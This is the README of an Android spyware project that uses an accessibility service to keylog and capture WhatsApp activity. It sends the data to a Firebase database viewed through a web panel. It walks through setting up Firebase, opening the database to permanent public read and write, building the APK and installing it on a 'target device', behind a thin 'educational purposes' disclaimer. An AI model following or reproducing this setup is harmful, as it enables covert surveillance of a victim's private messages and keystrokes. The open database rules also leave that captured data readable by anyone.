# 🚀 Here I Come With an Update Absolutely No One Asked For

Despite the issues with the Discord and Telegram versions, I wanted to make one that saves everything to a Firebase Realtime Database, plus a web panel to see live updates.

---
# WARNING - RULES ARE THE SAME
> [!CAUTION]
This open-source project is intended for educational and research purposes only. By using this software, you acknowledge and agree that:
* User Responsibility: You, the user, bear full responsibility for how you utilize this software.
* Legality: Installing or using this software on devices owned by third parties without their explicit consent is illegal and constitutes a violation of privacy laws.

* Creator Disclaimer: The creator and contributors of this project are not liable for any misuse or unlawful actions conducted by users of this software.
* Another Disclaimer: I have no idea what I'm doing here. 

## What's The Difference?

- Now, instead of logging to Discord or Telegram, it sends data directly to a Firebase Realtime Database, which you 🫵🏻 are going to create. 
- Fixes for things you didn’t notice were broken (you’re welcome)
- Refactored some code and tweaked a few functions
- Removed the pointless UI from MainActivity (the app runs as a background accessibility service, so there is no point on keeping that).
- Improved keylogger. 

# Tutorial ↓
## 1. Create Your Firebase Project

Every Firebase journey begins with creating a project to house your apps and services.


1.  **Navigate to the Firebase Console:** Open your browser and go to the [Firebase console](https://console.firebase.google.com/). Sign in with your Google account.

2.  **Add Project:** On the main dashboard, click the **"Add project"** card.

3.  **Name Your Project:** Provide a name for your project. A unique Project ID will be automatically generated below the name. Click **"Continue"**.

4.  **Create Project:** Click the **"Create project"** button. Firebase will take a moment to provision your new project.

---

## 2. Register Your Apps in the Firebase Console

With your project created, you now need to register your applications to connect them to Firebase services.

### Registering Your Web App

1.  **Select Web App:** From your project's "Project Overview" page, click the web icon (`</>`) to start the registration process.

2.  **Enter App Details:**
    * **App nickname:** Give your web app a recognizable name.
    
3.  **Register App:** Click **"Register app"**. You will be shown a configuration object with your project's keys. Since your app is already set up, you can simply click **"Continue to console"**.

### Registering Your Android App

1.  **Select Android App:** From the "Project Overview" page, click **"Add app"** and then select the Android icon (🤖).

2.  **Enter App Details:**
    * **Android package name:** Enter your app's unique package name (e.g., `com.yourcompany.yourapp`). This must match the `applicationId` in your `build.gradle` file.
    * **App nickname (Optional):** A name to help you identify the app.

3.  **Register and Download:** Click **"Register app"**. On the next screen, click **"Download google-services.json"**. This file is essential for your app to connect to Firebase. Finally, click **"Next"** and then **"Continue to console"**.

**⚠️ IMPORTANT:** Place the `google-services.json` file inside `firebaseVersion → app → src → main`.


---

## 3. Create and Configure the Realtime Database

The final step is to set up the database and define its access rules.

1.  **Navigate to Realtime Database:** In the left-hand navigation menu of the Firebase console, go to **Build > Realtime Database**.

2.  **Create Database:** Click the **"Create Database"** button.

3.  **Select Database Location:** A pop-up will ask you to select a location for your database server. Choose a region closest to your user base. This choice is permanent. Click **"Next"**.

4.  **Set Initial Security Rules:** You will be prompted to choose between "locked mode" and "test mode". Select **"Start in test mode"**.
    * **⚠️ Warning:** Test mode allows open access for a limited time. For permanent public access, you must manually edit the rules in the next step.

5.  **Enable Database:** Click **"Enable"**.

### Setting Permanent Public Read & Write Rules

To ensure your database is always publicly accessible for both reading and writing:

1.  **Open the Rules Tab:** Once the database is created, navigate to the **"Rules"** tab at the top of the Realtime Database window.

2.  **Edit the Rules:** You will see a JSON editor with the default test mode rules. Replace the existing rules with the following:

    ```json
    {
      "rules": {
        ".read": true,
        ".write": true
      }
    }
    ```

3.  **Publish Your Changes:** Click the **"Publish"** button. A warning will appear to inform you that your database is open to anyone. Confirm the change.

Your Firebase project is now fully configured with your apps registered and a Realtime Database that is publicly readable and writable.


# 📦 APK Generation & 🌐 Web Panel Setup Guide

This guide explains how to generate the APK and configure the Firebase-powered web panel for your application.

---

## 📱 APK Setup

Follow these steps to properly configure and build the Android APK:

1. **Add `google-services.json`**
   - Download the `google-services.json` file from your Firebase project.
   - Place it inside:  
     ```
     firebaseVersion/app/src/main/
     ```

2. **Match the Package Name**
   - Ensure the package name in Firebase matches your Android Studio project.
   - If you haven't changed it, the default package name is:  
     ```
     MyWaAppExemple
     ```

3. **Build the App**
   - Once the steps above are complete, build the APK using Android Studio.

---

## 🌐 Web Panel Setup

Set up the Firebase Web Panel by following the instructions below:

1. **Access Firebase Project Settings**
   - Go to the [Firebase Console](https://console.firebase.google.com/)
   - Select your project
   - Click the ⚙️ **gear icon** → **Project Settings**
   - Scroll to the bottom under **Your apps** and find your Web App

2. **Get Firebase Config**
   - Click on your Web App
   - Under **SDK setup and configuration**, switch to the **Config** tab
   - Copy the object that looks like this:
     ```javascript
     const firebaseConfig = {
       apiKey: "YOUR_API_KEY",
       authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
       projectId: "YOUR_PROJECT_ID",
       storageBucket: "YOUR_PROJECT_ID.appspot.com",
       messagingSenderId: "YOUR_SENDER_ID",
       appId: "YOUR_APP_ID"
     };
     ```

3. **Insert Config into Web Panel**
   - Open the file:
     ```
     WEBPANEL/webpanel.html
     ```
   - Find the comment:
     ```html
     //Firebase config - Replace by your firebaseConfig
     ```
   - Replace that line with your `firebaseConfig` object.

4. **Test the Web Panel**
   - Save the changes
   - Open `webpanel.html` in your browser to verify everything works correctly

---

## Target device

1. Move the built APK to the target device and install it manually, or use ADB to install it.
2. Enable it in Accessibility Settings (just like the base app)
<img src="https://raw.githubusercontent.com/wellrodrig/Whatsapp-Spy/master/images/Enabling%20Acessibility%20Service.gif" width="200"/>

## ✅ Final Notes

- You may want to update instances of `getTimeZone("America/Los_Angeles")` in `MyAccessibilityService.java` to match your local time zone. [Click here](https://en.wikipedia.org/wiki/List_of_tz_database_time_zones) to get the full list.

- Keep your `firebaseConfig` credentials private and secure when deploying to production.

---

> **⚠️ Important Note:** Google might ask you to upgrade your Firebase plan, which needs a valid credit card.  
> I’ve done dozens of tests and haven’t been charged so far, but I can’t guarantee the same for you.


